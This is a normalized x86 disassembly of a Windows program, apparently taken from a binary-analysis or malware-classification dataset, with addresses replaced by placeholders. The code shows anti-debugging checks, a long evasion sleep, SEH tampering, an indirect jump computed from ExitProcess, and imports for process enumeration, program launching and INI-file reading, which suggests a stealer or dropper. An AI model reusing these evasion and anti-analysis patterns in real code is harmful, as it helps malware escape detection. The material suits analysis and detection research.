mov dx [ ecx + eax * 2 ]
cmp dx [ esp + 0x8 ]
je r-xdata
sub_4120bc
push ebx
xor ecx ecx
cmp [ esp + 0x10 ] ecx
push esi
push edi
jbe r-xdata
xor eax eax
mov esi [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov edi esi
mov eax edx
sub edi edx
add ecx ecx
movzx eax [ ecx + esi ]
movzx ecx [ ecx + edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc eax
inc eax
cmp ecx [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov bx [ edi + eax ]
cmp bx [ eax ]
jne r-xdata
sub_4120fb
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
test edx edx
jbe r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub eax ecx
push esi
mov si [ eax + ecx ]
mov [ ecx ] si
inc ecx
inc ecx
dec edx
jne r-xdata
pop esi
sub_412120
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
cmp eax esi
ja r-xdata
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
push [ esp + 0x10 ]
push esi
push eax
call sub_4120fb
add esp 0xc
pop esi
retn
pop esi
retn
lea ecx [ eax + edx * 2 - 0x2 ]
sub esi eax
push edi
mov di [ esi + ecx ]
mov [ ecx ] di
dec edx
dec ecx
dec ecx
test edx edx
jne r-xdata
pop edi
sub_41215d
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov eax [ esp + 0x8 ]
mov dx ax
push edi
mov edi [ esp + 0x8 ]
shl edx 0x10
mov dx ax
shr ecx 0x1
mov eax edx
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_412192
push ebp
mov ebp esp
sub esp 0xe4
push ebx
push esi
push edi
and [ ebp - 0x10 ] 0x0
push eax
mov eax [ fs : 0x18 ]
mov eax [ eax + 0x30 ]
movzx eax [ eax + 0x2 ]
mov [ ebp - 0x10 ] eax
pop eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
call sub_40b559
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] sub_412188
pusha
lea ebx [ ebp - 0x8 ]
mov [ fs : 0x0 ] ebx
popa
call sub_40b79a
push 0x8007
call [ SetErrorMode@IAT ]
call sub_40b8bd
and [ ebp - 0xc ] 0x0
call sub_404ebb
movzx eax al
test eax eax
je r-xdata
mov eax [ ExitProcess@IAT ]
and eax 0xfff00000
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
and eax 0xffff
add eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
jmp [ eax ]
push [ ebp - 0xc ]
call sub_40e879
pop ecx
call sub_40bb9f
call sub_40e634
call sub_40bdbc
push 0x40
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
call sub_401000
cmp eax 0x1
jne r-xdata
mov [ ebp - 0xc ] 0x1
push 0x1b7740
call [ Sleep@IAT ]
call [ IsDebuggerPresent@IAT ]
cmp eax 0x1
jne r-xdata
call sub_412188
call sub_40b79a
call sub_40e674
call sub_40b8bd
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_412188
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x10
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x18
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
dec eax
mov [ rw-data ] eax
call sub_40b559
push r--data
call sub_403094
pop ecx
call sub_40b79a
call sub_4030e4
call sub_40b8bd
call sub_403380
call sub_40b559
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call sub_40e3ce
test eax eax
je r-xdata
call sub_40112f
cmp [ rw-data ] 0x0
je r-xdata
call sub_404d24
push 0x0
call sub_40510e
pop ecx
push 0x0
call [ ExitProcess@IAT ]
push 0x0
call [ ExitProcess@IAT ]
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
push 0x0
call [ ExitProcess@IAT ]
call sub_40bb9f
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_404b38
call sub_40b79a
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_408153
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_407988
call sub_40b79a
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_407c94
call sub_40b559
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_4078b7
call sub_40bb9f
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_403e8f
call sub_40bb9f
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_402175
call sub_40b8bd
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_40361f
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_405fb2
call sub_40bdbc
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_40a1a4
call sub_40b8bd
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_4070c4
call sub_40b559
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_401f35
call sub_40bb9f
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_405a96
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_405c2e
call sub_40b79a
push 0x15
call sub_411160
pop ecx
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
call sub_401975
and [ ebp - 0xd0 ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x88 ]
call sub_40eb9e
mov [ ebp - 0xd0 ] eax
jmp r-xdata
and [ ebp - 0xd4 ] 0x0
push 0x1
mov ecx [ ebp - 0x94 ]
call sub_4029dc
mov [ ebp - 0xd4 ] eax
jmp r-xdata
mov eax [ ebp - 0xd0 ]
mov [ ebp - 0x14 ] eax
push rw-data
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x14 ]
call sub_40ec7e
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x98 ] eax
mov eax [ ebp - 0x98 ]
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
je r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
call sub_412188
call sub_40b559
call sub_401000
cmp eax 0x1
jne r-xdata
push 0x64
call sub_411160
pop ecx
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0x9c ]
mov [ rw-data ] eax
push rw-data
push [ rw-data ]
call sub_4116d8
pop ecx
pop ecx
push 0xf
pop ecx
mov esi r--data
lea edi [ ebp - 0x54 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x54 ]
push eax
call sub_411738
pop ecx
test eax eax
jbe r-xdata
call sub_412188
mov ecx rw-data
call sub_40ee85
push rw-data
call sub_40d15c
pop ecx
call sub_40b79a
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
push 0x15
call sub_411160
pop ecx
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
call sub_40bdbc
call sub_40b02e
movzx eax al
test eax eax
jne r-xdata
call sub_402c7f
and [ ebp - 0xd8 ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0xa0 ]
call sub_40eb9e
mov [ ebp - 0xd8 ] eax
jmp r-xdata
call sub_40bb9f
push 0x0
call [ ExitProcess@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call sub_40510e
pop ecx
mov [ ebp - 0x5c ] eax
xor eax eax
inc eax
je r-xdata
and [ ebp - 0xdc ] 0x0
push 0x1
mov ecx [ ebp - 0xac ]
call sub_4029dc
mov [ ebp - 0xdc ] eax
jmp r-xdata
mov eax [ ebp - 0xd8 ]
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x58 ]
call sub_40ec7e
mov eax [ ebp - 0x58 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x0
je r-xdata
mov ecx rw-data
call sub_4023d6
mov eax [ rw-data ]
add eax 0x4
mov [ rw-data ] eax
mov eax [ rw-data ]
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x8
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x10
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sar eax 0x18
and eax 0xff
push eax
mov ecx rw-data
call sub_40f645
mov eax [ rw-data ]
sub eax 0x4
mov [ rw-data ] eax
push 0x15
call sub_411160
pop ecx
mov [ ebp - 0xb4 ] eax
cmp [ ebp - 0xb4 ] 0x0
je r-xdata
and [ ebp - 0xe0 ] 0x0
push 0x3e8
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0xb4 ]
call sub_40eb9e
mov [ ebp - 0xe0 ] eax
jmp r-xdata
and [ ebp - 0xe4 ] 0x0
push 0x1
mov ecx [ ebp - 0xc8 ]
call sub_4029dc
mov [ ebp - 0xe4 ] eax
jmp r-xdata
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0x70 ] eax
push [ rw-data ]
push 0x14
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x70 ]
call sub_40ec7e
push r--data
lea ecx [ ebp - 0x6c ]
call sub_40f45c
lea ecx [ ebp - 0x6c ]
call sub_401018
push eax
lea ecx [ ebp - 0x6c ]
call sub_40101c
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_40c364
add esp 0xc
lea ecx [ ebp - 0x80 ]
call sub_40101c
push eax
lea ecx [ ebp - 0x80 ]
call sub_401018
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x70 ]
call sub_40ec7e
mov eax [ ebp - 0x5c ]
add eax 0x30
mov [ ebp - 0x81 ] al
lea eax [ ebp - 0x81 ]
push eax
push 0x1
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp - 0x70 ]
call sub_40ec7e
mov eax [ ebp - 0x70 ]
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0xcc ]
mov [ ebp - 0xc8 ] eax
cmp [ ebp - 0xc8 ] 0x0
je r-xdata
push rw-data
call sub_40d15c
pop ecx
lea ecx [ ebp - 0x80 ]
call sub_40f609
lea ecx [ ebp - 0x6c ]
call sub_40f609
sub_4128b9
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push rw-data
push rw-data
push rw-data
push rw-data
call [ GetCurrentProcess@IAT ]
push eax
call [ GetProcessTimes@IAT ]
mov [ rw-data ] sub_412192
push eax
lea eax [ rw-data ]
jmp [ eax ]
sub_4023d6
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_4023b8
and [ esi ] 0x0
pop esi
retn
sub_4024af
push esi
push 0x800
mov esi ecx
and [ esi + 0x18 ] 0x0
push 0x40
call [ GlobalAlloc@IAT ]
mov [ esi ] eax
mov [ eax ] 0x0
and [ esi + 0x14 ] 0x0
mov eax esi
pop esi
retn
sub_4024d0
push [ ecx ]
call [ GlobalFree@IAT ]
retn
sub_402548
push [ esp + 0x4 ]
call sub_4024d9
neg al
sbb eax eax
inc eax
retn 0x4
sub_4032af
push 0x0
push [ esp + 0x8 ]
call [ ShowWindow@IAT ]
xor eax eax
inc eax
retn 0x8
sub_403eef
xor eax eax
push eax
push eax
push 0xffffffff
push [ esp + 0x10 ]
push eax
push 0xfde9
call [ MultiByteToWideChar@IAT ]
retn
sub_40623f
mov eax ecx
mov cl [ eax + 0x208 ]
mov [ eax + 0x104 ] cl
mov [ eax ] cl
retn
sub_4062be
push esi
mov esi ecx
push [ esi + 0x418 ]
call [ HeapDestroy@IAT ]
mov esi [ esi + 0x104 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_410a7a
pop ecx
sub_4064b6
push esi
mov esi ecx
push [ esi + 0x428 ]
call [ HeapDestroy@IAT ]
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_4062be
sub_40659c
push [ ecx + 0x4 ]
call [ HeapDestroy@IAT ]
retn
sub_40667d
mov eax [ ecx ]
retn
sub_406680
mov eax [ esp + 0x4 ]
cmp eax [ ecx ]
jl r-xdata
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 ]
xor eax eax
jmp r-xdata
retn 0x4
sub_406850
push esi
mov esi ecx
call sub_40659c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_410a7a
pop ecx
sub_4084b2
mov al cl
and al 0x80
neg al
sbb al al
add cl cl
and eax 0x1b
xor al cl
retn
sub_40ab2a
mov eax ecx
and [ eax + 0x20 ] 0x0
retn
sub_40b30f
xor eax eax
cmp [ ecx + 0x8 ] eax
sete al
retn
sub_40cbbe
mov dl [ ecx ]
push ebx
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
pop ebx
retn
sub_40d272
push esi
mov esi ecx
lea ecx [ esi + 0x11 ]
call sub_40f609
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_40f609
sub_40d286
push esi
mov esi ecx
call sub_40d272
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_410a7a
pop ecx
sub_40d9bf
xor eax eax
retn
sub_40e0f0
push esi
mov esi ecx
call sub_40f609
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_410a7a
pop ecx
sub_40eb5c
push esi
push 0x100
mov esi ecx
call sub_411160
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
retn
sub_40eb70
push [ ecx ]
call sub_410a7a
pop ecx
retn
sub_40eb79
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_40f5f9
and [ esi ] 0x0
mov eax esi
pop esi
retn
sub_40eb8b
push esi
lea esi [ ecx + 0x4 ]
mov ecx esi
call sub_4023b8
mov ecx esi
pop esi
jmp sub_40f609
sub_40f095
mov eax [ esp ]
retn
sub_40f5f9
mov eax ecx
xor ecx ecx
mov [ eax + 0xc ] cl
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
retn
sub_40f627
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
lea eax [ ecx + 0xc ]
mov edx [ esp + 0x4 ]
test edx edx
jl r-xdata
cmp edx [ ecx + 0x8 ]
jge r-xdata
add eax edx
jmp r-xdata
retn 0x4
sub_40f6ee
push esi
push [ esp + 0xc ]
mov esi ecx
call sub_40f645
mov ecx [ esp + 0x8 ]
push esi
call sub_40f594
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
sub_40f841
push esi
mov esi ecx
call sub_4023b8
push [ esp + 0xc ]
mov ecx esi
call sub_40f645
mov ecx [ esp + 0x8 ]
push esi
call sub_40f594
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
sub_40f8a9
push [ esp + 0x4 ]
call sub_40f7cb
neg al
sbb eax eax
inc eax
retn 0x4
sub_40f8bc
push edx
lea edx [ esp + 0x8 ]
sub edx eax
test [ eax + edx ] ecx
sub eax 0x1000
jae r-xdata
pop eax
xchg edx eax
xchg esp eax
jmp [ eax ]
sub_40f8fc
sub esp 0xc
fwait
fnstcw [ esp ]
fldcw [ r--data ]
fistp [ esp + 0x4 ]
fldcw [ esp ]
pop eax
pop eax
pop edx
retn
sub_40f914
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
sete cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_410070
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
rol eax cl
retn
sub_41007c
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
ror eax cl
retn
sub_41076c
push 0xffffffff
call [ ExitProcess@IAT ]
sub_410778
mov eax [ esp + 0x4 ]
cdq
xor eax edx
sub eax edx
retn
sub_410784
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fxch st1
fpatan
retn
sub_410798
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fxch st1
fpatan
retn
sub_4107f4
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fpatan
retn
sub_410808
fld [ esp + 0x4 ]
fld st0
fmul st0
fld1
fsubrp st1
fsqrt
fpatan
retn
sub_410891
mov eax [ rw-data ]
cmp eax 0x20
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ eax * 4 + rw-data ] ecx
inc eax
mov [ rw-data ] eax
xor eax eax
retn
or eax 0xffffffff
retn
sub_4108b3
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
dec [ rw-data ]
mov eax [ rw-data ]
call [ eax * 4 + rw-data ]
retn
sub_4108d1
push 0x0
push [ esp + 0x8 ]
call sub_4118cd
pop ecx
pop ecx
retn
sub_4108df
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_411ad7
add esp 0xc
retn
sub_4108f0
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_411ad7
add esp 0xc
retn
sub_410962
mov eax [ esp + 0x4 ]
imul eax [ esp + 0x8 ]
push eax
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
retn
sub_41097c
fld [ esp + 0x4 ]
jmp sub_410986
sub_410982
fld [ esp + 0x4 ]
sub_4109a0
call [ GetTickCount@IAT ]
sub eax [ rw-data ]
retn
sub_4109ad
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_4109bc
fld [ esp + 0x4 ]
fcos
retn
sub_4109c4
fld [ esp + 0x4 ]
fcos
retn
sub_410a7a
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_410a94
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
sub_410aca
call sub_4108b3
push 0x0
push rw-data
push rw-data
call sub_40f929
push 0x0
push rw-data
push rw-data
call sub_40f929
add esp 0x18
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_410b7a
xor eax eax
retn
sub_410c28
fld [ esp + 0x4 ]
jmp sub_410c32
sub_410c2e
fld [ esp + 0x4 ]
sub_410c4c
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_410d51
add esp 0xc
retn
sub_410d3e
push [ esp + 0x4 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
retn
sub_410e24
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
push 0x0
push [ esp + 0x10 ]
push [ eax ]
call [ SetFilePointer@IAT ]
inc eax
neg eax
sbb eax eax
inc eax
retn
sub_410e80
mov eax [ esp + 0x4 ]
push 0x1
push 0x0
push 0x0
push [ eax ]
call [ SetFilePointer@IAT ]
retn
sub_410f3f
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jb r-xdata
xor eax eax
inc eax
retn
add eax 0xffffffbf
cmp eax 0x1a
jb r-xdata
xor eax eax
retn
sub_410f5a
cmp [ esp + 0x4 ] 0x14
jb r-xdata
xor eax eax
inc eax
retn
cmp [ esp + 0x4 ] 0x7f
je r-xdata
xor eax eax
retn
sub_410f9a
mov eax [ esp + 0x4 ]
cmp eax 0x20
je r-xdata
xor eax eax
inc eax
retn
add eax 0xfffffff7
cmp eax 0x5
jb r-xdata
xor eax eax
retn
sub_410fd8
fild [ esp + 0xc ]
fld [ esp + 0x4 ]
fscale
retn
sub_410fe4
fild [ esp + 0x8 ]
fld [ esp + 0x4 ]
fscale
retn
sub_41100c
fldln2
fld [ esp + 0x4 ]
fyl2x
retn
sub_411018
fldlg2
fld [ esp + 0x4 ]
fyl2x
retn
sub_411024
fldlg2
fld [ esp + 0x4 ]
fyl2x
retn
sub_411030
fld1
fld [ esp + 0x4 ]
fyl2x
retn
sub_41103c
fld1
fld [ esp + 0x4 ]
fyl2x
retn
sub_411048
fldln2
fld [ esp + 0x4 ]
fyl2x
retn
sub_411051
mov eax [ rw-data ]
test eax eax
jne r-xdata
push [ esp + 0x4 ]
push 0x0
push eax
call [ HeapAlloc@IAT ]
retn
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
sub_41140f
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_411419
mov eax [ rw-data ]
imul eax eax 0x41c64e6d
add eax 0x3039
mov [ rw-data ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_411437
mov ecx [ esp + 0x4 ]
mov eax [ ecx ]
imul eax eax 0x41c64e6d
add eax 0x3039
mov [ ecx ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_41147b
push 0xf0000000
push 0x1
push 0x0
push 0x0
push rw-data
call [ CryptAcquireContextA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_411497
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
sub_4114aa
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
retn
sub_4114c1
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_4114d1
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ MoveFileA@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_4114e5
xor eax eax
push eax
push eax
push eax
mov eax [ esp + 0x10 ]
push [ eax ]
call [ SetFilePointer@IAT ]
retn
sub_4114f8
fld [ esp + 0x4 ]
jmp sub_411502
sub_4114fe
fld [ esp + 0x4 ]
sub_411548
fld [ esp + 0x4 ]
fsin
retn
sub_411550
fld [ esp + 0x4 ]
fsin
retn
sub_4115cd
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ wvsprintfA@IAT ]
retn
sub_4115e4
fld [ esp + 0x4 ]
fsqrt
retn
sub_4115ec
fld [ esp + 0x4 ]
fsqrt
retn
sub_411679
mov eax [ esp + 0x4 ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
movsx ecx cl
cmp ecx [ esp + 0x8 ]
je r-xdata
xor eax eax
retn
inc eax
sub_4116b4
push 0xffffffff
push [ esp + 0xc ]
push 0xffffffff
push [ esp + 0x10 ]
push 0x0
push 0x800
call [ CompareStringA@IAT ]
lea ecx [ eax - 0x2 ]
neg eax
sbb eax eax
and eax ecx
retn
sub_4116d8
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push ecx
mov al [ edx ]
inc edx
mov [ ecx ] al
inc ecx
test al al
jne r-xdata
pop eax
retn
sub_411726
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call [ lstrcmpiA@IAT ]
retn
j_sub_411ad7
jmp sub_411ad7
sub_411bc8
fld [ esp + 0x4 ]
fptan
fstp st0
retn
sub_411bd4
fld [ esp + 0x4 ]
fptan
fstp st0
retn
sub_411c52
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x1a
jae r-xdata
retn
add eax 0x20
sub_411c62
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jae r-xdata
retn
add eax 0xffffffe0
sub_411c74
fld [ esp + 0x4 ]
jmp sub_411c7e
sub_411c7a
fld [ esp + 0x4 ]
sub_411c95
mov eax [ esp + 0x4 ]
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
retn
mov ecx [ esp + 0x8 ]
cmp [ ecx + 0x4 ] 0xffffffff
jne r-xdata
mov [ ecx + 0x4 ] eax
retn
sub_411d61
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ wvsprintfA@IAT ]
retn
sub_411d99
mov eax [ esp + 0x4 ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx [ esp + 0x8 ]
je r-xdata
xor eax eax
retn
inc eax
inc eax
sub_411dda
push 0xffffffff
push [ esp + 0xc ]
push 0xffffffff
push [ esp + 0x10 ]
push 0x0
push 0x800
call [ CompareStringW@IAT ]
lea ecx [ eax - 0x2 ]
neg eax
sbb eax eax
and eax ecx
retn
sub_411e5e
mov ecx [ esp + 0x4 ]
xor eax eax
cmp [ ecx ] ax
je r-xdata
retn
inc eax
cmp [ ecx + eax * 2 ] 0x0
jne r-xdata
_start
push ecx
lea ecx [ esp ]
call sub_4128b9
xor eax eax
pop ecx
retn
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetCurrentDirectoryA
jmp [ GetCurrentDirectoryA@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetACP
jmp [ GetACP@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetSystemTime
jmp [ GetSystemTime@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetDriveTypeA
jmp [ GetDriveTypeA@IAT ]
GetLogicalDrives
jmp [ GetLogicalDrives@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
FileTimeToSystemTime
jmp [ FileTimeToSystemTime@IAT ]
GetFileTime
jmp [ GetFileTime@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
Sleep
jmp [ Sleep@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcatA
jmp [ lstrcatA@IAT ]
Thread32Next
jmp [ Thread32Next@IAT ]
Thread32First
jmp [ Thread32First@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
CreateProcessA
jmp [ CreateProcessA@IAT ]
GetSystemDirectoryA
jmp [ GetSystemDirectoryA@IAT ]
GetTempFileNameA
jmp [ GetTempFileNameA@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
lstrcpynA
jmp [ lstrcpynA@IAT ]
GetPrivateProfileStringA
jmp [ GetPrivateProfileStringA@IAT ]
GetPrivateProfileSectionNamesA
jmp [ GetPrivateProfileSectionNamesA@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
SetLastError
jmp [ SetLastError@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
WinExec
jmp [ WinExec@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
UnmapViewOfFile
jmp [ UnmapViewOfFile@IAT ]
MapViewOfFile
jmp [ MapViewOfFile@IAT ]
CreateFileMappingA
jmp [ CreateFileMappingA@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
ExpandEnvironmentStringsA
jmp [ ExpandEnvironmentStringsA@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapCreate
jmp [ HeapCreate@IAT ]
HeapDestroy
jmp [ HeapDestroy@IAT ]
HeapReAlloc
jmp [ HeapReAlloc@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
GetVolumeInformationA
jmp [ GetVolumeInformationA@IAT ]
GetWindowsDirectoryA
jmp [ GetWindowsDirectoryA@IAT ]
GetEnvironmentVariableA
jmp [ GetEnvironmentVariableA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
DuplicateHandle
jmp [ DuplicateHandle@IAT ]
CreatePipe
jmp [ CreatePipe@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
CreateNamedPipeA
jmp [ CreateNamedPipeA@IAT ]
GetShortPathNameA
jmp [ GetShortPathNameA@IAT ]
SetErrorMode
